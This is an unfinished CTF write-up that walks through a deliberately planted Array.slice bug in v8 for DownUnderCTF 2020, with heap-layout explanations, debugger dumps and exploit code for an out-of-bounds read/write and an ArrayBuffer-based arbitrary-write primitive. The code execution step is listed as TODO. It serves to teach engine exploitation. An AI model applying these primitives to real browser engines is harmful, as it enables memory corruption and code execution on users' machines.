# v8 Exploitation Basics: DownUnderCTF `Is this pwn or web?`

I spent some time this weekend participating in [DownUnderCTF 2020](https://downunderctf.com/), which was blast. One of the pwn challenges, `Is this pwn or web?` (challenge archive [here](https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/pwn/is-this-pwn-or-web)), caught my attention. I had never done any v8/js exploitation before, and this seemed like a perfect opportunity to learn. And in fact this challenge does provide an excellent introduction to v8/javascript engine exploitation.

## Dependencies
This post is written with the assumption that you're familiar with "normal" linux userland exploitation. Experience with heap exploitation would be helpful, but probably isn't a must. I also assume your familiar with javascript, at least on a surface level.

I encourage you to follow along! You'll need a linux box of some description, I did my work on a Kali WSL image, but anything should work. I'm using [pwndbg](https://github.com/pwndbg/pwndbg) with GDB, which is where the `dq` and `dd` come from, and I'll be using [pwntools](https://github.com/Gallopsled/pwntools) in a couple of places.


## Initial Recon
We get a number of files:
 - `patch.diff` - Patch to v8 that introduces a vulnerability
 - `d8` - Javascript shell built with patch applied
 - `server.py` - Python script that accepts js script as input and runs it with modified `d8`
 - `snapshot_blob.bin` - Not sure, didn't turn out to be relevant

The challenge description says that once we gain code execution, we just have to run the `/home/ctf/flagprinter` binary. That's boring though, so we'll get a shell instead.

## The Vulnerability

The patch does a couple of things, including disabling `imports`, but the vulnerability is introduced in `Array.slice()`. Here's the relevant part of the patch

```
    | diff --git a/src/builtins/array-slice.tq b/src/builtins/array-slice.tq
    | index 7b82f2bda3..4b9478f84e 100644
    | --- a/src/builtins/array-slice.tq
    | +++ b/src/builtins/array-slice.tq
    | @@ -101,7 +101,14 @@ macro HandleFastSlice(
    |          // to be copied out. Therefore, re-check the length before calling
    |          // the appropriate fast path. See regress-785804.js
    |          if (SmiAbove(start + count, a.length)) goto Bailout;
    | -        return ExtractFastJSArray(context, a, start, count);
    | +        // return ExtractFastJSArray(context, a, start, count);
    | +        // Instead of doing it the usual way, I've found out that returning it
    | +        // the following way gives us a 10x speedup!
    | +        const array: JSArray = ExtractFastJSArray(context, a, start, count);
<1> | +        const newLength: Smi = Cast<Smi>(count - start + SmiConstant(2))
    | +            otherwise Bailout;
    | +        array.ChangeLength(newLength);
    | +        return array;
    |        }
    |        case (a: JSStrictArgumentsObject): {
    |          goto HandleSimpleArgumentsSlice(a);
```

The vulnerability is in the new length calculation (`<1>`). For instance, if `count` is 1 and `start` is 4, the length of the array will be set to -1! Surely that won't cause any problems.

As a note, `Array.slice()` takes a `start` and an `end` parameter. `count` is calculated in another part of the code as `end - start`, so the above example can be triggered by calling `slice(4, 5)`:

```
count = end - start  ->  count = 5 - 4  ->  count = 1

newLength = count - start + 2  ->  newLength = 1 - 4 + 2  ->  newLength = -1
```

**What language is this?** Most (all?) of the Javascript builtins in v8 are implemented in [Torque](https://v8.dev/docs/torque), a custom langue meant specifically for working with v8.

Lets fire up the included `d8` shell and try it out. For reasons that I'll explain later, I'll be using an array of floats.

```js
    | > ./d8
    | V8 version 8.7.9
    | d8> a = [0.1, 0.2, 0.3, 0.4, 0.5, 0.6]
    | [0.1, 0.2, 0.3, 0.4, 0.5, 0.6]
<1> | d8> s = a.slice(4, 5)
    | []
<2> | d8> s.length
    | -1
<3> | d8> s[0]
    | 0.5
<4> | d8> s[1]
    | 4.768128617178215e-270
    | d8>
```
 - `<1>` - Our first sign that something is strange. We would normally expect `a.slice(4,5)` to return `[0.5]`, but it looks like we got an empty array.
 - `<2>` - We can see that the vulnerability was triggered, as the length has been set to -1. That's why it's displaying like it's empty.
 - `<3>` - We can see here that the data did in fact get copied over. The first element of the array is 0.5, like we expect.
 - `<4>` - The next element is unexpected, however. First of all it shouldn't exist, the slice _should_ only contain one element. Second, that's an awfully strange value. What's going on here?

The answer is probably obvious if you've done some pwn challenges before. -1, when interpreted as an unsigned integer, is an extremely large value. This is giving us an out of bounds read at `<4>`. The reason for the weird float value is that v8 is taking the next 8 bytes after the array and interpreting them as a IEEE 754 double. Since we can also set values in the array, this gives a relative out of bounds (OOB) read/write!

In order to be truly effective, we'll need a way to translate between the double representation, and the actual bits of the number. I'll steal some code from [here](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/)

```js
/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
```
Sample usage:
```js
d8> ftoi(4.768128617178215e-270).toString(16)
"80426dd082438fd"
```

At this point, I started a script called `pwn.js`, including the above utilities and the beginnings of the exploit:

```js
// Conversion utilities omitted

origin = [0.1, 0.2, 0.3, 0.4, 0.5, 0.6];
oob = origin.slice(4, 5);
```

If we now run `./d8 --shell pwn.js`, v8 will first execute our `pwn.js` script, and then drop us into an interactive shell so we can debug and play around.

Lets take a closer look at how v8 represents some of it's internal objects in memory, and how we can use this powerful primitive to abuse them.

## Debugging v8
The binary gives us a modified `d8`, which is a JS shell. A couple of useful options:
 - `--shell` - Normally when passed a js file on the command line, `d8` will exit after it's finished running. This keeps the shell open, useful for debugging
 - `--allow-natives-syntax` - Allow the calling of native functions, pre-pended by a `%`. The most useful of these is `%DebugPrint(jsObj)`, which will print out information about the internal structure of js objects.

For most of the examples here, I'll be running in gdb with `gdb ./d8` and starting with `run --allow-natives-syntax`

## v8 Heap Internals
v8 does a lot of manual memory management and tricks to squeeze out as much performance as it can. This is a complex topic, but here is some information on the parts that are relevant for this challenge.

### Bump Allocator
Instead of using the glibc malloc() implementation, v8 uses a custom, deterministic bump allocator to hold javascript objects. This is useful for us, since it means that _most_ objects JS objects will be at known offsets. This assumption can break if you reach the end of the heap or a GC pass runs, but for this challenge it's perfectly valid.

### Pointer Compression
In an effort to save space, v8 recently introduced [pointer compression](https://v8.dev/blog/pointer-compression), switching from a 64bit value to a 32bit offset. This has a couple implications, the main one for us is that getting the full address of an object on the v8 heap becomes more difficult.

A lot of existing articles and writeups are written with the old 64bit pointers, so be careful not to get tripped up when reading around online.

### Pointer tagging
v8 uses another trick with it's pointers to save space and increase performance: pointer tagging. If a value has the least significant bit is set, then the value is treated as a pointer. If it's cleared, then instead it's treated as a number. When treated as a number, the value is called a small integer, or Smi.

When treating the value as a pointer, the actual offset (remember, these are compressed pointers) is calculated by first subtracting 1, clearing the LSB. This means that we loose some granularity, but keep our entire memory range addressable.

Then treating the value as an Smi, the LSB is ignored, and the remaining 31 bits are treated as an integer. So we can't store a full 32 bit value, but hey, they're called "small" for a reason.

```
Pointer:    |-------- -------- -------- -------1| -> offset = raw - 1

Smi:        |-------- -------- -------- -------0| -> value = raw >> 1
```

**64 bit Smis:** Before pointer compression was introduced, Smis were able to hold a full 32 bit value. They did this by keeping the lower 4 bytes entirely 0, and storing the value in the upper 4 bytes. So if you see references to Smis that look like `0x4141414100000000` in old documentation and blog posts, that's why.


## JSArrays in memory
Now that we have some understanding of how pointers and the v8 heap are handled, let's take a look at the internals of a JSArray object. We'll start with the `origin` array, since it hasn't been messed with yet:

**Note:** I'm simplifying and skipping over a ton here. Javascript lets you do some crazy things, and v8 gets up to some pretty serious heroics in order to run performantly. See this [blog post](https://mathiasbynens.be/notes/shapes-ics) for some more information.

```
<1> | d8> a = [0.1, 0.2, 0.3, 0.4, 0.5, 0.6]
    | [0.1, 0.2, 0.3, 0.4, 0.5, 0.6]
<2> | d8> %DebugPrint(a)
<3> | DebugPrint: 0x3e9a08084a59: [JSArray]
    |  - map: 0x3e9a082438fd <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
    |  - prototype: 0x3e9a0820a555 <JSArray[0]>
<4> |  - elements: 0x3e9a08084a21 <FixedDoubleArray[6]> [PACKED_DOUBLE_ELEMENTS]
<5> |  - length: 6
    |  - properties: 0x3e9a080426dd <FixedArray[0]> {
    |     0x3e9a08044649: [String] in ReadOnlySpace: #length: 0x3e9a08182159 <AccessorInfo> (const accessor descriptor)
    |  }
    |  - elements: 0x3e9a08084a21 <FixedDoubleArray[6]> {
    |            0: 0.1
    |            1: 0.2
    |            2: 0.3
    |            3: 0.4
    |            4: 0.5
    |            5: 0.6
    |  }
    | 0x3e9a082438fd: [Map]
    |  - type: JS_ARRAY_TYPE
    |  - instance size: 16
    |  - inobject properties: 0
    |  - elements kind: PACKED_DOUBLE_ELEMENTS
    |  - unused property fields: 0
    |  - enum length: invalid
    |  - back pointer: 0x3e9a082438d5 <Map(HOLEY_SMI_ELEMENTS)>
    |  - prototype_validity cell: 0x3e9a08182445 <Cell value= 1>
    |  - instance descriptors #1: 0x3e9a0820abd9 <DescriptorArray[1]>
    |  - transitions #1: 0x3e9a0820ac25 <TransitionArray[4]>Transition array #1:
    |      0x3e9a08044f5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x3e9a08243925 <Map(HOLEY_DOUBLE_ELEMENTS)>
    | 
    |  - prototype: 0x3e9a0820a555 <JSArray[0]>
    |  - constructor: 0x3e9a0820a429 <JSFunction Array (sfi = 0x3e9a0818b399)>
    |  - dependent code: 0x3e9a080421e1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
    |  - construction counter: 0
    | 
    | [0.1, 0.2, 0.3, 0.4, 0.5, 0.6]
```

Here we allocate an array of floats (`<1>`) and use `%DebugPrint()` to view its internal info (`<2>`. Remember to use `--allow-natives-syntax`). Some interesting properties:
 - `<3>` - The address of this object. This (and most of the other pointers displayed by `%DebugPrint()`) are tagged, so remember to subtract 1 when you need the _actual_ address
 - `<4>` - Pointer to backing array object. This backing array is where the actual data is stored.
 - `<5>` - Length of the array. Note that the backing array (`<4>`) has it's own length field, but only this one is used when doing bounds checks. The one on the backing array is ignored.

Let's take a look at what the object looks like in memory (remember to subtract 1 from the address given by `%DebugPrint()`)

```
pwndbg> dd 0x3e9a08084a59-1 4
00003e9a08084a58     082438fd 080426dd 08084a21 0000000c
```

Here's an annotated version

```
+------------+------------+------------+------------+
| map        | properties | elements   | length     |
+------------+------------+------------+------------+
| 0x082438fd | 0x080426dd | 0x08084a21 | 0x0000000c |
+------------+------------+------------+------------+
```

Lets take a closer look at how pointer compression works. Take the elements pointer, for example. We know it's actual address is 0x008508084a21, but instead of storing the entire thing, we store a 32 bit offset (0x08084a21) from the base of the heap (0x008500000000). Since the base is the same for every object in this heap, it can be stored just once, somewhere else.

The length field also needs a closer look. We know the array has 6 elements, why is it being stored as 12 (0xc)? The answer is that it's being stored as an Smi, and so data is only stored in the upper 31 bits and needs to be shifted down to be read.

```
length      = 0xc   = |00000000 00000000 00000000 00001100|

length >> 1 = 6     = |00000000 00000000 00000000 00000110|
```

## FixedDoubleArray in memory
As we saw above, the actual values in a JSArray are stored separately, and referenced by the `elements` pointer. Lets take a look there in GDB

```
pwndbg> dd 0x3e9a08084a21-1
0000008508084a20     08042a31 0000000c 9999999a 3fb99999
0000008508084a30     9999999a 3fc99999 33333333 3fd33333
0000008508084a40     9999999a 3fd99999 00000000 3fe00000
0000008508084a50     33333333 3fe33333 082438fd 080426dd
pwndbg> dq 0x3e9a08084a21-1
0000008508084a20     0000000c08042a31 3fb999999999999a
0000008508084a30     3fc999999999999a 3fd3333333333333
0000008508084a40     3fd999999999999a 3fe0000000000000
0000008508084a50     3fe3333333333333 080426dd082438fd
```

I'm viewing both by dwords and quads, as some of values are 32 bits, and others 64.

```
+------------+------------+--------------------+-----+--------------------+
| map        | length     | a[0]               | ... | a[5]               |
+------------+------------+--------------------+-----+--------------------+
| 0x082438fd | 0x0000000c | 0x3fb999999999999a | ... | 0x3fe3333333333333 |
+------------+------------+--------------------+-----+--------------------+
```

First comes the map pointer, and then the length of the backing array (stored as an Smi again). Finally, the six elements of our array are stored directly as IEEE doubles.

## Out of Bounds
Lets take a look at the `oob` slice now.

```
    | d8> %DebugPrint(oob)
    | DebugPrint: 0x341208085d31: [JSArray]
    |  - map: 0x3412082438fd <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
    |  - prototype: 0x34120820a555 <JSArray[0]>
    |  - elements: 0x341208085d21 <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
<1> |  - length: -1
    |  - properties: 0x3412080426dd <FixedArray[0]> {
    |     0x341208044649: [String] in ReadOnlySpace: #length: 0x341208182159 <AccessorInfo> (const accessor descriptor)
    |  }
<2> |  - elements: 0x341208085d21 <FixedDoubleArray[1]> {
    |            0: 0.5
    |  }
    | 0x3412082438fd: [Map]
    |  - type: JS_ARRAY_TYPE
    |  - instance size: 16
    |  - inobject properties: 0
    |  - elements kind: PACKED_DOUBLE_ELEMENTS
    |  - unused property fields: 0
    |  - enum length: invalid
    |  - back pointer: 0x3412082438d5 <Map(HOLEY_SMI_ELEMENTS)>
    |  - prototype_validity cell: 0x341208182445 <Cell value= 1>
    |  - instance descriptors #1: 0x34120820abd9 <DescriptorArray[1]>
    |  - transitions #1: 0x34120820ac25 <TransitionArray[4]>Transition array #1:
    |      0x341208044f5d <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x341208243925 <Map(HOLEY_DOUBLE_ELEMENTS)>
    | 
    |  - prototype: 0x34120820a555 <JSArray[0]>
    |  - constructor: 0x34120820a429 <JSFunction Array (sfi = 0x34120818b399)>
    |  - dependent code: 0x3412080421e1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
    |  - construction counter: 0
    | 
    | []
```

```
pwndbg> dd 0x341208085d31-1 4
0000341208085d30     082438fd 080426dd 08085d21 fffffffe
```

```
+------------+------------+------------+------------+
| map        | properties | elements   | length     |
+------------+------------+------------+------------+
| 0x082438fd | 0x080426dd | 0x08085d21 | 0xfffffffe |
+------------+------------+------------+------------+
```

Here we can see the effect setting the length (`<1>`) to -1 had. When interpreted as an unsigned integer (like during bounds checks), it is treated as `0x7fffffff (2147483647)` since it's encoded as an Smi. The length on the backing array (`<2>`) is correct, however, as mentioned above only the length on the JSArray object matters.

We can verify that our OOB read is working by viewing the memory around the backing array with GDB (`0x3fe0000000000000` is 0.5, the first and only value in the array):
```
pwndbg> dq 0x341208085d21-1
0000341208085d20     0000000208042a31 3fe0000000000000
0000341208085d30     080426dd082438fd fffffffe08085d21
0000341208085d40     080426dd0824579d 08085d31080426dd
0000341208085d50     080426dd082422cd 08042301080426dd
```

```js
d8> ftoi(oob[1]).toString(16)
"80426dd082438fd"
d8> ftoi(oob[2]).toString(16)
"fffffffe08085d21"
```

**Note:** You might have noticed that backing array actually comes directly _before_ the JSArray, meaning it was allocated first. This won't be directly useful to us here, but it can be helpful if your overwrite is more limited than ours is. The minimal overwrite is first used to edit the size of the original array, turning what could be a two element overwrite into an arbitrarily large one. The official solve script does this.

## Arbitrary Write
Our OOB R/W is powerful, but not omnipotent. Our array has a lot of elements, but we can't address the entire 64bit address space, and we can't access memory behind us. Out next step will be to turn our relative R/W into one that can address arbitrary memory. Enter the [ArrayBuffer](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer).

ArrayBuffers are essentially byte arrays. We can use various typed array objects to interact with the buffer as different types (this is how `ftoi()` and `itof()` work). More importantly for us though, an ArrayBuffer has a full 64bit pointer to it's backing store:

```
    | d8> victim_buf = new ArrayBuffer(0x41)
    | [object ArrayBuffer]
    | d8> %DebugPrint(victim_buf)
    | DebugPrint: 0x341208087c0d: [JSArrayBuffer]
    |  - map: 0x34120824317d <Map(HOLEY_ELEMENTS)> [FastProperties]
    |  - prototype: 0x341208208ba9 <Object map = 0x3412082431a5>
    |  - elements: 0x3412080426dd <FixedArray[0]> [HOLEY_ELEMENTS]
    |  - embedder fields: 2
<1> |  - backing_store: 0x555556adc5c0
    |  - byte_length: 65
    |  - detachable
    |  - properties: 0x3412080426dd <FixedArray[0]> {}
    |  - embedder fields = {
    |     0, aligned pointer: (nil)
    |     0, aligned pointer: (nil)
    |  }
    | 0x34120824317d: [Map]
    |  - type: JS_ARRAY_BUFFER_TYPE
    |  - instance size: 56
    |  - inobject properties: 0
    |  - elements kind: HOLEY_ELEMENTS
    |  - unused property fields: 0
    |  - enum length: invalid
    |  - stable_map
    |  - back pointer: 0x341208042301 <undefined>
    |  - prototype_validity cell: 0x341208182445 <Cell value= 1>
    |  - instance descriptors (own) #0: 0x3412080421a9 <DescriptorArray[0]>
    |  - prototype: 0x341208208ba9 <Object map = 0x3412082431a5>
    |  - constructor: 0x341208208ad9 <JSFunction ArrayBuffer (sfi = 0x34120818a1d1)>
    |  - dependent code: 0x3412080421e1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
    |  - construction counter: 0
    | 
    | [object ArrayBuffer]
```

```
pwndbg> dd 0x341208087c0d-1
0000341208087c0c     0824317d 080426dd 080426dd 00000041
0000341208087c1c     00000000|56adc5c0 00005555|56adc610
0000341208087c2c     00005555 00000002 00000000 00000000
0000341208087c3c     00000000 00000000 08042a59 0000020a
```

If we use `oob` to overwrite the backing store pointer (`<1>`), any reads and writes to `victim_buf` will end up going to the, overwritten address! Unfortunately the pointer doesn't line up exactly with the 8 byte alignment of our `oob` array, so corrupting the pointer without clobbering anything else takes a bit of work. Note that fully correct implementation would also overwrite the ArrayBuffer's length field, but here we know that our initial size will be large enough for the data we need to write.

```js
function write(addr, data) {
    // Our OOB read/write is 8 bytes at a time, and it doesn't line up exactly with the 
    // address field of the victim buffer. So we need to do some finagling to write the
    // new address without clobbering other data. VICTIM_BUF_PTR_OFFSET was determined
    // experimentally.

    // Write lower half of new address
    const addr_low = addr & 0xffffffffn; 
    const curr_addr_low = ftoi(oob[VICTIM_BUF_PTR_OFFSET]);
    const new_addr_low = (addr_low << 32n) | (curr_addr_low & 0xffffffffn);
    oob[VICTIM_BUF_PTR_OFFSET] = itof(new_addr_low);

    // Write upper bytes of new address
    const addr_high = addr & 0xffffffff00000000n;
    const curr_addr_high = ftoi(oob[VICTIM_BUF_PTR_OFFSET + 1]);
    const new_addr_high = (addr_high >> 32n) | (curr_addr_high & 0xffffffff00000000n);
    oob[VICTIM_BUF_PTR_OFFSET + 1] = itof(new_addr_high);

    // Now that the address has been correctly set, write data at that address
    let u8_buf = new Uint8Array(victim_buf);
    for (let i = 0; i < data.length; i++) {
        u8_buf[i] = data[i];
    }
}
```

Read would be implemented in much the same wa, but it wasn't needed for this exploit and so is left as an exercise to the reader :)

## Sidebar: Arbitrary Heap R/W
Pointer compression means we generally only have the lower 32 bits of a javascript object's address in memory. This makes using the arbitrary r/w primitive above on the v8 heap objects difficult, as we would need to brute force a fair amount of ASLR. A way around this is to overwrite the `elements` pointer in an array, since that is also a 32 bit compressed pointer. I ended up using a different method I describe below, but the official solve script has an example. *Link Here*



## JSObjects in memory
```
    | d8> o = {numProp: 1, objProp: {}}
    | {numProp: 1, objProp: {}}
    | d8> %DebugPrint(o)
    | DebugPrint: 0x3e9a08086581: [JS_OBJECT_TYPE]
    |  - map: 0x3e9a0824579d <Map(HOLEY_ELEMENTS)> [FastProperties]
    |  - prototype: 0x3e9a08202629 <Object map = 0x3e9a082421b5>
    |  - elements: 0x3e9a080426dd <FixedArray[0]> [HOLEY_ELEMENTS]
    |  - properties: 0x3e9a080426dd <FixedArray[0]> {
<1> |     0x3e9a08211f85: [String] in OldSpace: #numProp: 1 (const data field 0)
<2> |     0x3e9a08211f99: [String] in OldSpace: #objProp: 0x3e9a080865b1 <Object map = 0x3e9a082422cd> (const data field 1)
    |  }
    | 0x3e9a0824579d: [Map]
    |  - type: JS_OBJECT_TYPE
    |  - instance size: 20
    |  - inobject properties: 2
    |  - elements kind: HOLEY_ELEMENTS
    |  - unused property fields: 0
    |  - enum length: 2
    |  - stable_map
    |  - back pointer: 0x3e9a08245775 <Map(HOLEY_ELEMENTS)>
    |  - prototype_validity cell: 0x3e9a08182445 <Cell value= 1>
    |  - instance descriptors (own) #2: 0x3e9a080865cd <DescriptorArray[2]>
    |  - prototype: 0x3e9a08202629 <Object map = 0x3e9a082421b5>
    |  - constructor: 0x3e9a08202645 <JSFunction Object (sfi = 0x3e9a08184875)>
    |  - dependent code: 0x3e9a080421e1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
    |  - construction counter: 0
    | 
    | {numProp: 1, objProp: {}}
```

For simple objects like this, the properties are actually stored inline. `numProp` (`<1>`), since it's value fits inside the Smi range, is encoded as one. `objProp` (`<2>`) is stored as a pointer to the other object.

```
pwndbg> dd 0x3e9a08086581-1
00003e9a08086580     0824579d 080426dd 080426dd 00000002
00003e9a08086590     080865b1 080421b9 00010001 00000000
00003e9a080865a0     08043161 08211f85 00000088|00000002|
00003e9a080865b0    |082422cd|080426dd 080426dd 08042301
```

Notice the highlighted entries. `0x00000002` is 1 encoded as an Smi, and `0x082422cd` is the compressed pointer to `objProp`.

TODO:
 - Inspect WasmInstance, show pointer to rwx code page
 - Explain how to use resulting OOB R/W to achieve and addrof
 - Explain how to use above primitives to gain arbitrary code execution using a compiled wasm module
 - Talk about Maps?